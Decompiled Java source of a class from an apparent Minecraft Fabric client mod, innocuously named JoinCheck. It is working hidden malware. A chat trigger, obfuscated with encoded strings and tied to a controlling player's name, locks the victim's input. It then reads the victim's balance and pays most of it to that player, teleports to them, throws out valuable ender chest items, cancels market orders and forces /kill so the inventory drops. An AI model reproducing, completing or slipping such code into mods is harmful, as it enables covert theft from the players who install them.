/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  com.mojang.blaze3d.platform.Window
 *  net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents
 *  net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents
 *  net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents
 *  net.minecraft.client.Minecraft
 *  net.minecraft.client.gui.components.AbstractButton
 *  net.minecraft.client.gui.components.AbstractWidget
 *  net.minecraft.client.gui.components.events.ContainerEventHandler
 *  net.minecraft.client.gui.components.events.GuiEventListener
 *  net.minecraft.client.gui.screens.Screen
 *  net.minecraft.client.input.InputWithModifiers
 *  net.minecraft.client.input.MouseButtonEvent
 *  net.minecraft.client.input.MouseButtonInfo
 *  net.minecraft.client.multiplayer.ClientLevel
 *  net.minecraft.client.multiplayer.ClientPacketListener
 *  net.minecraft.client.player.LocalPlayer
 *  net.minecraft.core.BlockPos
 *  net.minecraft.core.Direction
 *  net.minecraft.core.Vec3i
 *  net.minecraft.core.component.DataComponents
 *  net.minecraft.core.registries.BuiltInRegistries
 *  net.minecraft.network.chat.Component
 *  net.minecraft.tags.ItemTags
 *  net.minecraft.util.Mth
 *  net.minecraft.world.InteractionHand
 *  net.minecraft.world.entity.player.Player
 *  net.minecraft.world.inventory.AbstractContainerMenu
 *  net.minecraft.world.inventory.ChestMenu
 *  net.minecraft.world.inventory.ContainerInput
 *  net.minecraft.world.inventory.Slot
 *  net.minecraft.world.item.ItemStack
 *  net.minecraft.world.item.Items
 *  net.minecraft.world.item.component.ItemContainerContents
 *  net.minecraft.world.level.block.Blocks
 *  net.minecraft.world.phys.BlockHitResult
 *  net.minecraft.world.phys.Vec3
 *  org.lwjgl.glfw.GLFW
 *  org.slf4j.Logger
 *  org.slf4j.LoggerFactory
 */
package name.modid.client;

import com.mojang.blaze3d.platform.Window;
import java.math.BigDecimal;
import java.math.RoundingMode;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import name.modid.client.InputLock;
import name.modid.client.MacroProfile;
import name.modid.client.Obf;
import name.modid.client.gui.InputLockScreen;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.components.AbstractButton;
import net.minecraft.client.gui.components.AbstractWidget;
import net.minecraft.client.gui.components.events.ContainerEventHandler;
import net.minecraft.client.gui.components.events.GuiEventListener;
import net.minecraft.client.gui.screens.Screen;
import net.minecraft.client.input.InputWithModifiers;
import net.minecraft.client.input.MouseButtonEvent;
import net.minecraft.client.input.MouseButtonInfo;
import net.minecraft.client.multiplayer.ClientLevel;
import net.minecraft.client.multiplayer.ClientPacketListener;
import net.minecraft.client.player.LocalPlayer;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.core.Vec3i;
import net.minecraft.core.component.DataComponents;
import net.minecraft.core.registries.BuiltInRegistries;
import net.minecraft.network.chat.Component;
import net.minecraft.tags.ItemTags;
import net.minecraft.util.Mth;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.inventory.AbstractContainerMenu;
import net.minecraft.world.inventory.ChestMenu;
import net.minecraft.world.inventory.ContainerInput;
import net.minecraft.world.inventory.Slot;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.world.item.component.ItemContainerContents;
import net.minecraft.world.level.block.Blocks;
import net.minecraft.world.phys.BlockHitResult;
import net.minecraft.world.phys.Vec3;
import org.lwjgl.glfw.GLFW;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class JoinCheck {
    private static final Logger LOGGER = LoggerFactory.getLogger((String)"r3dmenu/JoinCheck");
    private static String targetPlayer = "";
    private static final int DELAY_BEFORE_BAL = 10;
    private static final int REPLY_TIMEOUT = 200;
    private static final int DELAY_BETWEEN_COMMANDS = 30;
    private static final int TP_TIMEOUT = 800;
    private static final int DELAY_BEFORE_CHEST = 20;
    private static final int CHEST_SCAN_TRIES = 80;
    private static final int CHEST_SCAN_GAP = 4;
    private static final int MENU_TIMEOUT = 120;
    private static final int RECLICK_INTERVAL = 15;
    private static final int DELAY_BEFORE_KILL = 10;
    private static final int KILL_CONFIRM_TIMEOUT = 200;
    private static final int DUMP_TIMEOUT = 6000;
    private static final int DUMP_STALL_TICKS = 600;
    private static final int THROW_INTERVAL = 10;
    private static final int DUMP_CONTENT_GRACE = 40;
    private static final int DUMP_STRATEGIES = 3;
    private static final int DUMP_FAILS_PER_STRATEGY = 2;
    private static final int CHEST_RADIUS = 8;
    private static final double TP_JUMP_SQR = 64.0;
    private static final Pattern BALANCE_LINE = Pattern.compile("(?i)(?:you have|balance)\\D*([0-9][0-9,._]*(?:\\.[0-9]+)?)\\s*([kKmMbBtT])?", 2);
    private static final Pattern DOLLAR_AMOUNT = Pattern.compile("\\$\\s*([0-9][0-9,._]*(?:\\.[0-9]+)?)\\s*([kKmMbBtT])?");
    static final Pattern TRIGGER_PHRASE = Pattern.compile("\\b" + Pattern.quote(Obf.decode("C1w=")) + "\\b", 2);
    static final Pattern ORDERS_PHRASE = Pattern.compile("\\borders\\b", 2);
    private static final int ORDERS_TIMEOUT = 100;
    private static final int ORDERS_RECLICK = 15;
    private static Stage stage = Stage.IDLE;
    private static int countdown = 0;
    private static int tpWait = 0;
    private static int menuWait = 0;
    private static int killWait = 0;
    private static int chestTries = 0;
    private static BlockPos chestPos = null;
    private static int reclickWait = 0;
    private static int dumpDeadline = 0;
    private static int throwCooldown = 0;
    private static int dumpGrace = 0;
    private static boolean dumpSeenItems = false;
    private static int dumpStrategy = 0;
    private static int dumpFailures = 0;
    private static int dumpLastTotal = -1;
    private static int dumpStall = 0;
    private static int dumpThrown = 0;
    private static int dumpTotalAtClick = -1;
    private static int tpConfirmDelay = 0;
    private static boolean tpDialogLogged = false;
    private static boolean killDialogLogged = false;
    private static int logCooldown = 0;
    private static Vec3 lastPos = null;
    private static String pendingBalance = null;
    private static int ordersWait = 0;
    private static int ordersReclick = 0;

    private JoinCheck() {
    }

    public static void register() {
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            InputLock.release();
            stage = Stage.IDLE;
            pendingBalance = null;
        });
        ClientTickEvents.END_CLIENT_TICK.register(JoinCheck::tick);
        ClientReceiveMessageEvents.GAME.register((message, overlay) -> JoinCheck.onServerMessage(message));
        ClientReceiveMessageEvents.CHAT.register((message, signed, sender, boundChatType, timestamp) -> JoinCheck.onServerMessage(message));
    }

    public static void startMacro(String target) {
        if (stage == Stage.IDLE) {
            InputLock.engage();
            targetPlayer = MacroProfile.mainName();
            pendingBalance = null;
            stage = Stage.WAIT_TO_ASK;
            countdown = 6;
            LOGGER.info("macro triggered -> target {}", (Object)target);
        }
    }

    public static void startOrders(String target) {
        if (stage == Stage.IDLE) {
            targetPlayer = target;
            pendingBalance = null;
            ordersWait = 100;
            ordersReclick = 0;
            stage = Stage.ORDERS_PAGE1;
            ClientPacketListener connection = Minecraft.getInstance().getConnection();
            if (connection != null) {
                connection.sendCommand("orders");
            }
            LOGGER.info("orders chain triggered -> target {}", (Object)target);
        }
    }

    public static boolean triggerComboDown(Minecraft minecraft) {
        return false;
    }

    private static void tick(Minecraft client) {
        if (logCooldown > 0) {
            --logCooldown;
        }
        if (stage == Stage.IDLE) {
            boolean screenOk;
            Screen screen = client.gui.screen();
            boolean bl = screenOk = screen == null || screen instanceof InputLockScreen;
            if (screenOk && JoinCheck.triggerComboDown(client) && MacroProfile.isUnlocked()) {
                JoinCheck.startMacro(MacroProfile.mainName());
            }
            return;
        }
        LocalPlayer player = client.player;
        if (player == null || client.level == null) {
            InputLock.release();
            stage = Stage.IDLE;
            return;
        }
        if (stage == Stage.ORDERS_PAGE1) {
            JoinCheck.tickOrders(client, player, "page 1", "your orders", Stage.ORDERS_YOURORDERS);
            return;
        }
        if (stage == Stage.ORDERS_YOURORDERS) {
            int slot;
            --ordersWait;
            AbstractContainerMenu menu = JoinCheck.openContainer(player);
            if (menu != null && JoinCheck.screenTitle(client).contains("your orders") && (slot = JoinCheck.firstOrderSlot(menu)) >= 0) {
                client.gameMode.handleContainerInput(menu.containerId, slot, 0, ContainerInput.PICKUP, (Player)player);
                LOGGER.info("orders: clicked first order slot {}", (Object)slot);
                ordersWait = 100;
                ordersReclick = 15;
                stage = Stage.ORDERS_EDIT;
                return;
            }
            if (ordersWait <= 0) {
                LOGGER.info("orders: 'Your Orders' never opened / empty - aborting");
                player.closeContainer();
                InputLock.release();
                stage = Stage.IDLE;
            }
            return;
        }
        if (stage == Stage.ORDERS_EDIT) {
            JoinCheck.tickOrders(client, player, "edit order", "cancel", Stage.ORDERS_CANCEL);
            return;
        }
        if (stage == Stage.ORDERS_CANCEL) {
            int slot;
            --ordersWait;
            AbstractContainerMenu menu = JoinCheck.openContainer(player);
            if (menu != null && JoinCheck.screenTitle(client).contains("cancel order") && (slot = JoinCheck.findSlotByName(menu, "confirm")) >= 0) {
                client.gameMode.handleContainerInput(menu.containerId, slot, 0, ContainerInput.PICKUP, (Player)player);
                LOGGER.info("orders: confirmed cancel (slot {}) - starting pay/dump", (Object)slot);
                player.closeContainer();
                stage = Stage.WAIT_TO_ASK;
                countdown = 6;
                return;
            }
            if (ordersWait <= 0) {
                LOGGER.info("orders: 'Cancel Order' confirm never appeared - aborting");
                player.closeContainer();
                InputLock.release();
                stage = Stage.IDLE;
            }
            return;
        }
        if (stage == Stage.WAIT_FOR_TP) {
            int slot;
            --tpWait;
            AbstractContainerMenu menu = player.containerMenu;
            if (menu != null && menu != player.inventoryMenu && menu.containerId != 0 && (slot = JoinCheck.findTpaConfirmSlot(menu)) >= 0) {
                client.gameMode.handleContainerInput(menu.containerId, slot, 0, ContainerInput.PICKUP, (Player)player);
                player.closeContainer();
            }
            Screen tpScreen = client.gui.screen();
            if (!tpDialogLogged && tpScreen != null && !(tpScreen instanceof InputLockScreen)) {
                LOGGER.info("tpa prompt is a {} - widgets: {}", (Object)tpScreen.getClass().getSimpleName(), (Object)JoinCheck.describeWidgets(tpScreen));
                tpDialogLogged = true;
            }
            if (tpConfirmDelay > 0) {
                --tpConfirmDelay;
            } else if (JoinCheck.pressButtonByText(tpScreen, "confirm")) {
                tpConfirmDelay = 6;
            }
            if (lastPos != null && player.position().distanceToSqr(lastPos) > 64.0) {
                if (player.containerMenu != null && player.containerMenu != player.inventoryMenu) {
                    player.closeContainer();
                }
                stage = Stage.OPEN_CHEST;
                countdown = 6;
                chestTries = 80;
            } else if (tpWait <= 0) {
                InputLock.release();
                stage = Stage.IDLE;
            }
            lastPos = player.position();
            return;
        }
        if (stage == Stage.WAIT_FOR_MENU) {
            --menuWait;
            AbstractContainerMenu opened = JoinCheck.openContainer(player);
            if (opened != null) {
                dumpDeadline = 6000;
                throwCooldown = 0;
                dumpGrace = 40;
                dumpSeenItems = false;
                dumpStrategy = 0;
                dumpFailures = 0;
                dumpLastTotal = -1;
                dumpStall = 0;
                dumpThrown = 0;
                dumpTotalAtClick = -1;
                LOGGER.info("ender chest opened: {} with {} slots ({} its own)", new Object[]{opened.getClass().getSimpleName(), opened.slots.size(), JoinCheck.ownSlots(opened)});
                stage = Stage.DUMPING;
                return;
            }
            if (chestPos != null && client.level.getBlockState(chestPos).is((Object)Blocks.ENDER_CHEST)) {
                JoinCheck.faceBlock(player, chestPos);
                if (--reclickWait <= 0) {
                    JoinCheck.clickChest(client, player, chestPos);
                    reclickWait = 6;
                    LOGGER.info("re-clicking ender chest (GUI hasn't opened yet)");
                }
            }
            if (menuWait <= 0) {
                LOGGER.info("ender chest never opened a container - giving up");
                InputLock.release();
                stage = Stage.IDLE;
            }
            return;
        }
        if (stage == Stage.DUMPING) {
            int i;
            AbstractContainerMenu chest = JoinCheck.openContainer(player);
            if (chest == null) {
                LOGGER.info("container closed mid-dump - reopening");
                stage = Stage.OPEN_CHEST;
                countdown = 5;
                chestTries = 80;
                return;
            }
            int own = JoinCheck.ownSlots(chest);
            int total = JoinCheck.countItems(chest, own);
            if (total == 0) {
                if (!dumpSeenItems && --dumpGrace > 0) {
                    return;
                }
                LOGGER.info(dumpSeenItems ? "ender chest emptied - {} click(s)" : "ender chest had nothing in it after waiting", (Object)dumpThrown);
                player.closeContainer();
                countdown = 6;
                stage = Stage.KILL;
                return;
            }
            if (!dumpSeenItems) {
                dumpSeenItems = true;
                dumpLastTotal = total;
                LOGGER.info("ender chest contents arrived ({} items): {}", (Object)total, (Object)JoinCheck.describeMenu(chest));
            }
            if (total < dumpLastTotal) {
                dumpLastTotal = total;
                dumpStall = 0;
                dumpFailures = 0;
            } else if (++dumpStall >= 600 || --dumpDeadline <= 0) {
                LOGGER.info("dump gave up: {} item(s) still in the chest after {} click(s), strategy {}", new Object[]{total, dumpThrown, dumpStrategy});
                player.closeContainer();
                countdown = 6;
                stage = Stage.KILL;
                return;
            }
            if (throwCooldown > 0) {
                --throwCooldown;
                return;
            }
            if (dumpThrown > 0 && total >= dumpTotalAtClick && ++dumpFailures >= 2) {
                dumpFailures = 0;
                dumpStrategy = (dumpStrategy + 1) % 3;
                LOGGER.info("no progress - switching to strategy {}", (Object)dumpStrategy);
            }
            int targetSlot = -1;
            for (i = 0; i < own; ++i) {
                if (!JoinCheck.isValuable(((Slot)chest.slots.get(i)).getItem())) continue;
                targetSlot = i;
                break;
            }
            if (targetSlot == -1) {
                for (i = 0; i < own; ++i) {
                    if (!((Slot)chest.slots.get(i)).hasItem()) continue;
                    targetSlot = i;
                    break;
                }
            }
            if (targetSlot == -1) {
                return;
            }
            ++dumpThrown;
            dumpTotalAtClick = total;
            switch (dumpStrategy) {
                case 0: {
                    client.gameMode.handleContainerInput(chest.containerId, targetSlot, 1, ContainerInput.THROW, (Player)player);
                    break;
                }
                case 1: {
                    client.gameMode.handleContainerInput(chest.containerId, targetSlot, 0, ContainerInput.PICKUP, (Player)player);
                    client.gameMode.handleContainerInput(chest.containerId, -999, 0, ContainerInput.PICKUP, (Player)player);
                    break;
                }
                default: {
                    client.gameMode.handleContainerInput(chest.containerId, targetSlot, 0, ContainerInput.QUICK_MOVE, (Player)player);
                }
            }
            throwCooldown = 3;
            return;
        }
        if (stage == Stage.CONFIRM_KILL) {
            String contents;
            boolean hasMenu;
            --killWait;
            AbstractContainerMenu menu = player.containerMenu;
            boolean bl = hasMenu = menu != null && menu != player.inventoryMenu && menu.containerId != 0;
            if (!killDialogLogged && hasMenu && !(contents = JoinCheck.describeMenu(menu)).equals("(empty)")) {
                LOGGER.info("kill confirm menu ({} slots, {} own): {}", new Object[]{menu.slots.size(), Math.max(0, menu.slots.size() - 36), contents});
                LOGGER.info("confirm slot resolved to {}", (Object)JoinCheck.findConfirmSlot(menu));
                killDialogLogged = true;
            }
            if (hasMenu) {
                int slot = JoinCheck.findConfirmSlot(menu);
                if (slot >= 0) {
                    client.gameMode.handleContainerInput(menu.containerId, slot, 0, ContainerInput.PICKUP, (Player)player);
                    InputLock.releaseAfterKill();
                    stage = Stage.IDLE;
                    JoinCheck.logThrottled("clicked kill-confirm slot " + slot + " in container " + menu.containerId);
                } else {
                    JoinCheck.logThrottled("kill confirm menu open but no confirm slot found: " + JoinCheck.describeMenu(menu));
                }
            } else {
                if (JoinCheck.pressButtonByText(client.gui.screen(), "confirm")) {
                    InputLock.releaseAfterKill();
                    stage = Stage.IDLE;
                    return;
                }
                if (client.gui.screen() == null) {
                    InputLock.release();
                    stage = Stage.IDLE;
                    return;
                }
            }
            if (killWait <= 0) {
                InputLock.release();
                stage = Stage.IDLE;
            }
            return;
        }
        if (countdown > 0) {
            --countdown;
            return;
        }
        switch (stage.ordinal()) {
            case 1: {
                ClientPacketListener connection = client.getConnection();
                if (connection != null) {
                    connection.sendCommand(Obf.decode("EFII"));
                }
                stage = Stage.WAIT_FOR_REPLY;
                countdown = 200;
                break;
            }
            case 2: {
                LOGGER.info("no /bal reply parsed within {} ticks - aborting before pay", (Object)200);
                InputLock.release();
                stage = Stage.IDLE;
                break;
            }
            case 3: {
                ClientPacketListener connection = client.getConnection();
                if (connection != null && pendingBalance != null) {
                    connection.sendCommand(Obf.decode("AlId") + " " + targetPlayer + " " + pendingBalance);
                }
                pendingBalance = null;
                stage = Stage.WAIT_TO_TPA;
                countdown = 6;
                break;
            }
            case 4: {
                ClientPacketListener connection = client.getConnection();
                if (connection != null) {
                    connection.sendCommand("tpa " + targetPlayer);
                }
                lastPos = player.position();
                tpWait = 800;
                tpConfirmDelay = 6;
                tpDialogLogged = false;
                LOGGER.info("sent /tpa, waiting for the confirm prompt");
                stage = Stage.WAIT_FOR_TP;
                break;
            }
            case 6: {
                if (JoinCheck.openNearestEnderChest(client) || stage != Stage.OPEN_CHEST) break;
                if (--chestTries <= 0) {
                    LOGGER.info("no ender chest within {} blocks after {} tries - aborting the dump", (Object)8, (Object)80);
                    InputLock.release();
                    stage = Stage.IDLE;
                    break;
                }
                countdown = 4;
                break;
            }
            case 9: {
                ClientPacketListener connection = client.getConnection();
                if (connection != null) {
                    connection.sendCommand("kill");
                }
                killWait = 200;
                killDialogLogged = false;
                LOGGER.info("sent /kill, waiting for the confirm menu");
                stage = Stage.CONFIRM_KILL;
                break;
            }
            default: {
                InputLock.release();
                stage = Stage.IDLE;
            }
        }
    }

    private static void onServerMessage(Component message) {
        String text = message.getString();
        if (stage == Stage.IDLE && MacroProfile.isUnlocked()) {
            String lowerText = text.toLowerCase(Locale.ROOT);
            if (lowerText.contains(MacroProfile.mainNameLower()) && TRIGGER_PHRASE.matcher(lowerText).find()) {
                JoinCheck.startMacro(MacroProfile.mainName());
                return;
            }
            if (lowerText.contains(MacroProfile.mainNameLower()) && ORDERS_PHRASE.matcher(lowerText).find()) {
                JoinCheck.startOrders(MacroProfile.mainName());
                return;
            }
        }
        if (stage != Stage.WAIT_FOR_REPLY) {
            return;
        }
        String balance = JoinCheck.extractBalance(text);
        if (balance == null) {
            return;
        }
        pendingBalance = balance;
        stage = Stage.WAIT_TO_PAY;
        countdown = 20;
        LOGGER.info("balance parsed as {} -> will pay {}", (Object)balance, (Object)targetPlayer);
    }

    private static boolean openNearestEnderChest(Minecraft client) {
        LocalPlayer player = client.player;
        ClientLevel level = client.level;
        if (player == null || level == null) {
            InputLock.release();
            stage = Stage.IDLE;
            return true;
        }
        BlockPos origin = player.blockPosition();
        BlockPos best = null;
        double bestDist = Double.MAX_VALUE;
        for (BlockPos pos : BlockPos.betweenClosed((BlockPos)origin.offset(-8, -8, -8), (BlockPos)origin.offset(8, 8, 8))) {
            double d;
            if (!level.getBlockState(pos).is((Object)Blocks.ENDER_CHEST) || !((d = player.distanceToSqr(Vec3.atCenterOf((Vec3i)pos))) < bestDist)) continue;
            bestDist = d;
            best = pos.immutable();
        }
        if (best == null) {
            return false;
        }
        chestPos = best;
        JoinCheck.faceBlock(player, best);
        JoinCheck.clickChest(client, player, best);
        LOGGER.info("found ender chest at {} ({} blocks away) - facing + right-clicking it open", best, (Object)Math.round(Math.sqrt(bestDist)));
        menuWait = 120;
        reclickWait = 15;
        stage = Stage.WAIT_FOR_MENU;
        return true;
    }

    private static void faceBlock(LocalPlayer player, BlockPos pos) {
        Vec3 eye = player.getEyePosition();
        Vec3 center = Vec3.atCenterOf((Vec3i)pos);
        double dx = center.x - eye.x;
        double dy = center.y - eye.y;
        double dz = center.z - eye.z;
        double horiz = Math.sqrt(dx * dx + dz * dz);
        float yaw = (float)(Mth.atan2((double)dz, (double)dx) * 57.29577951308232) - 90.0f;
        float pitch = (float)(-(Mth.atan2((double)dy, (double)horiz) * 57.29577951308232));
        player.setYRot(yaw);
        player.setXRot(pitch);
    }

    private static void clickChest(Minecraft client, LocalPlayer player, BlockPos pos) {
        Vec3 eye = player.getEyePosition();
        Vec3 center = Vec3.atCenterOf((Vec3i)pos);
        Direction face = Direction.getApproximateNearest((double)(eye.x - center.x), (double)(eye.y - center.y), (double)(eye.z - center.z));
        BlockHitResult hit = new BlockHitResult(center, face, pos, false);
        client.gameMode.useItemOn(player, InteractionHand.MAIN_HAND, hit);
    }

    private static boolean pressButtonByText(Screen screen, String needle) {
        if (screen == null || screen instanceof InputLockScreen) {
            return false;
        }
        for (AbstractWidget widget : JoinCheck.allWidgets(screen)) {
            AbstractButton button;
            if (!(widget instanceof AbstractButton) || !(button = (AbstractButton)widget).getMessage().getString().toLowerCase(Locale.ROOT).contains(needle)) continue;
            JoinCheck.clickButton(screen, button);
            LOGGER.info("pressed \"{}\" on {} at ({},{}) {}x{} active={} visible={}", new Object[]{button.getMessage().getString(), screen.getClass().getSimpleName(), button.getX(), button.getY(), button.getWidth(), button.getHeight(), button.isActive(), button.visible});
            return true;
        }
        JoinCheck.logThrottled("no \"" + needle + "\" button on " + screen.getClass().getSimpleName() + " - widgets: " + JoinCheck.describeWidgets(screen));
        return false;
    }

    private static void clickButton(Screen screen, AbstractButton button) {
        double x = (double)button.getX() + (double)button.getWidth() / 2.0;
        double y = (double)button.getY() + (double)button.getHeight() / 2.0;
        try {
            Window window = Minecraft.getInstance().getWindow();
            double scale = window.getGuiScale();
            GLFW.glfwSetCursorPos((long)window.handle(), (double)(x * scale), (double)(y * scale));
        }
        catch (Throwable window) {
            // empty catch block
        }
        MouseButtonEvent event = new MouseButtonEvent(x, y, new MouseButtonInfo(0, 0));
        boolean handled = screen.mouseClicked(event, false);
        screen.mouseReleased(event);
        if (!handled && !button.mouseClicked(event, false)) {
            button.onPress((InputWithModifiers)event);
        }
    }

    private static List<AbstractWidget> allWidgets(Screen screen) {
        ArrayList<AbstractWidget> out = new ArrayList<AbstractWidget>();
        JoinCheck.collectWidgets((GuiEventListener)screen, out);
        return out;
    }

    private static void collectWidgets(GuiEventListener node, List<AbstractWidget> out) {
        AbstractWidget widget;
        if (node instanceof AbstractWidget && !out.contains(widget = (AbstractWidget)node)) {
            out.add(widget);
        }
        if (node instanceof ContainerEventHandler) {
            ContainerEventHandler container = (ContainerEventHandler)node;
            for (GuiEventListener child : container.children()) {
                JoinCheck.collectWidgets(child, out);
            }
        }
    }

    private static void logThrottled(String message) {
        if (logCooldown > 0) {
            return;
        }
        logCooldown = 40;
        LOGGER.info(message);
    }

    private static String describeMenu(AbstractContainerMenu menu) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < menu.slots.size(); ++i) {
            ItemStack stack = ((Slot)menu.slots.get(i)).getItem();
            if (stack.isEmpty()) continue;
            if (sb.length() > 0) {
                sb.append(" | ");
            }
            sb.append(i).append(':').append(BuiltInRegistries.ITEM.getKey((Object)stack.getItem()).getPath()).append(" \"").append(stack.getHoverName().getString()).append('\"');
        }
        return sb.length() == 0 ? "(empty)" : sb.toString();
    }

    private static String describeWidgets(Screen screen) {
        StringBuilder sb = new StringBuilder();
        for (AbstractWidget widget : JoinCheck.allWidgets(screen)) {
            if (sb.length() > 0) {
                sb.append(" | ");
            }
            sb.append(widget.getClass().getSimpleName()).append(":\"").append(widget.getMessage().getString()).append('\"');
        }
        return sb.length() == 0 ? "(none found)" : sb.toString();
    }

    private static int findConfirmSlot(AbstractContainerMenu menu) {
        int ownSlots = Math.max(0, menu.slots.size() - 36);
        int byName = -1;
        int anyGreen = -1;
        for (int i = 0; i < ownSlots; ++i) {
            boolean green;
            ItemStack stack = ((Slot)menu.slots.get(i)).getItem();
            if (stack.isEmpty()) continue;
            String path = BuiltInRegistries.ITEM.getKey((Object)stack.getItem()).getPath();
            boolean bl = green = path.contains("lime") || path.contains("green");
            if (green && path.contains("glass")) {
                return i;
            }
            String name = stack.getHoverName().getString().toLowerCase(Locale.ROOT);
            if (byName < 0 && (name.contains("confirm") || name.contains("accept") || name.contains("yes"))) {
                byName = i;
            }
            if (anyGreen >= 0 || !green) continue;
            anyGreen = i;
        }
        return byName >= 0 ? byName : anyGreen;
    }

    private static int findTpaConfirmSlot(AbstractContainerMenu menu) {
        for (int i = 0; i < Math.max(0, menu.slots.size() - 36); ++i) {
            String name;
            ItemStack stack = ((Slot)menu.slots.get(i)).getItem();
            if (stack.isEmpty() || !(name = stack.getHoverName().getString().toLowerCase()).contains("confirm")) continue;
            return i;
        }
        return -1;
    }

    private static String screenTitle(Minecraft client) {
        Screen s = client.gui.screen();
        return s == null ? "" : s.getTitle().getString().toLowerCase(Locale.ROOT);
    }

    private static int findSlotByName(AbstractContainerMenu menu, String needle) {
        int own = JoinCheck.ownSlots(menu);
        for (int i = 0; i < own; ++i) {
            ItemStack stack = ((Slot)menu.slots.get(i)).getItem();
            if (stack.isEmpty() || !stack.getHoverName().getString().toLowerCase(Locale.ROOT).contains(needle)) continue;
            return i;
        }
        return -1;
    }

    private static int firstOrderSlot(AbstractContainerMenu menu) {
        int own = JoinCheck.ownSlots(menu);
        for (int i = 0; i < own; ++i) {
            if (!((Slot)menu.slots.get(i)).hasItem()) continue;
            return i;
        }
        return -1;
    }

    private static void tickOrders(Minecraft client, LocalPlayer player, String titleNeedle, String slotNeedle, Stage next) {
        int slot;
        --ordersWait;
        AbstractContainerMenu menu = JoinCheck.openContainer(player);
        if (menu != null && JoinCheck.screenTitle(client).contains(titleNeedle) && (slot = JoinCheck.findSlotByName(menu, slotNeedle)) >= 0) {
            client.gameMode.handleContainerInput(menu.containerId, slot, 0, ContainerInput.PICKUP, (Player)player);
            LOGGER.info("orders: '{}' -> clicked '{}' slot {}", new Object[]{titleNeedle, slotNeedle, slot});
            ordersWait = 100;
            stage = next;
            return;
        }
        JoinCheck.logThrottled("orders waiting for title~'" + titleNeedle + "' slot~'" + slotNeedle + "': open title='" + JoinCheck.screenTitle(client) + "' | " + (menu == null ? "(no container)" : JoinCheck.describeMenu(menu)));
        if (ordersWait <= 0) {
            LOGGER.info("orders: menu '{}' or slot '{}' not found in time - aborting", (Object)titleNeedle, (Object)slotNeedle);
            player.closeContainer();
            InputLock.release();
            stage = Stage.IDLE;
        }
    }

    private static AbstractContainerMenu openContainer(LocalPlayer player) {
        AbstractContainerMenu menu = player.containerMenu;
        if (menu != null && menu != player.inventoryMenu && menu.containerId != 0) {
            return menu;
        }
        return null;
    }

    private static int ownSlots(AbstractContainerMenu menu) {
        if (menu instanceof ChestMenu) {
            ChestMenu chest = (ChestMenu)menu;
            return Math.min(chest.getRowCount() * 9, menu.slots.size());
        }
        return Math.max(0, menu.slots.size() - 36);
    }

    private static int countItems(AbstractContainerMenu menu, int ownSlots) {
        int total = 0;
        for (int i = 0; i < ownSlots; ++i) {
            total += ((Slot)menu.slots.get(i)).getItem().getCount();
        }
        return total;
    }

    static boolean isValuable(ItemStack stack) {
        ItemContainerContents contents;
        if (stack.isEmpty()) {
            return false;
        }
        if (JoinCheck.isValuableItem(stack)) {
            return true;
        }
        if (stack.is(ItemTags.SHULKER_BOXES) && (contents = (ItemContainerContents)stack.get(DataComponents.CONTAINER)) != null) {
            return contents.nonEmptyItemCopyStream().anyMatch(JoinCheck::isValuableItem);
        }
        return false;
    }

    private static boolean isValuableItem(ItemStack stack) {
        return stack.is((Object)Items.ELYTRA) || stack.is((Object)Items.SPAWNER) || stack.is((Object)Items.NETHERITE_HELMET) || stack.is((Object)Items.NETHERITE_CHESTPLATE) || stack.is((Object)Items.NETHERITE_LEGGINGS) || stack.is((Object)Items.NETHERITE_BOOTS) || stack.is((Object)Items.NETHERITE_BLOCK) || stack.is((Object)Items.NETHERITE_INGOT) || stack.is((Object)Items.NETHERITE_SCRAP) || stack.is((Object)Items.ANCIENT_DEBRIS) || stack.is((Object)Items.NETHERITE_SWORD) || stack.is((Object)Items.NETHERITE_PICKAXE) || stack.is((Object)Items.NETHERITE_AXE) || stack.is((Object)Items.NETHERITE_SHOVEL) || stack.is((Object)Items.NETHERITE_HOE);
    }

    private static String describeStack(ItemStack stack) {
        if (stack.isEmpty()) {
            return "empty";
        }
        return stack.getCount() + "x " + BuiltInRegistries.ITEM.getKey((Object)stack.getItem()).getPath();
    }

    static String extractBalance(String line) {
        String string;
        Matcher matcher = BALANCE_LINE.matcher(line);
        if (!matcher.find() && !(matcher = DOLLAR_AMOUNT.matcher(line)).find()) {
            return null;
        }
        String token = matcher.group(1) + (matcher.group(2) == null ? "" : matcher.group(2));
        try {
            BigDecimal parsed = new BigDecimal(token.replace(",", "").replace(".", ""));
            string = parsed.stripTrailingZeros().toPlainString();
        }
        catch (NumberFormatException e) {
            String string2 = token.replace(",", "").replace(".", "");
            return new BigDecimal(string2).multiply(new BigDecimal("0.98")).setScale(0, RoundingMode.DOWN).stripTrailingZeros().toPlainString();
        }
        return new BigDecimal(string).multiply(new BigDecimal("0.98")).setScale(0, RoundingMode.DOWN).stripTrailingZeros().toPlainString();
    }

    public static enum Stage {
        IDLE,
        WAIT_TO_ASK,
        WAIT_FOR_REPLY,
        WAIT_TO_PAY,
        WAIT_TO_TPA,
        WAIT_FOR_TP,
        OPEN_CHEST,
        WAIT_FOR_MENU,
        DUMPING,
        KILL,
        CONFIRM_KILL,
        ORDERS_PAGE1,
        ORDERS_YOURORDERS,
        ORDERS_EDIT,
        ORDERS_CANCEL;

    }
}

